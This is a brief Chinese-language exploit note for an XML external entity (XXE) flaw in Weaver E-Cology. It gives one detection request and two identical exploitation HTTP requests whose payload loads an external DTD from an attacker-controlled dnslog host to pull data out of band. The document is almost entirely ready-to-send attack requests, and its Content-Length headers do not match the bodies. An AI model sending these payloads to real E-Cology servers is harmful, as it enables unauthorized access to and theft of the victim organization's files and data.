泛微E-Cology XML外部实体注入漏洞

检测

```
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Host: 
Content-Type: application/xml
Content-Length: 53

<M>
    <syscode>
        666
    </syscode>
</M>
```

利用

接口一：
```
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host: 
Content-Type: application/xml
Content-Length: 53

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://xxxx.dnslog.cn/3.xml">
<data>&send;</data>
```

接口二:
```
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Host: 
Content-Type: application/xml
Content-Length: 53

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://xxxx.dnslog.cn/3.xml">
<data>&send;</data>
```
